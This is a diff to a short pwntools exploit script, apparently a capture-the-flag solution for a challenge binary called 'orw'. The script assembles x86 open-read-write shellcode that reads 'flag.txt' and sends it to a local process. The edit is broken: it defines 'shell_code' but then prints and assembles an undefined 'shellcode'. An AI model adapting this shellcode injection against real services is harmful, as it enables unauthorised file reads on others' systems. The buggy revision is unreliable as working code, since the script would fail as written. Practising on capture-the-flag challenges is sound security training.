@@ -1,7 +1,7 @@
 from pwn import *
 
 
-shell_code = asm('\n'.join([
+shell_code = '\n'.join([
     'push 0',
     'push %d' % u32('.txt'),
     'push %d' % u32('flag'),
@@ -42,13 +42,13 @@ shell_code = asm('\n'.join([
     'mov ebx, 0', # fd
     'mov eax, 4', # Write syscall number
     'int 0x80',
-]))
-
-
+])
+print(shellcode)
+assembly = asm(shellcode)
 conn = process('./orw')
 
 log.info('Pwning start')
 conn.recvuntil("Give my your shellcode:")
-conn.sendline(shell_code)
+conn.sendline(assembly)
 # print(conn.recvall())
 conn.recvall()
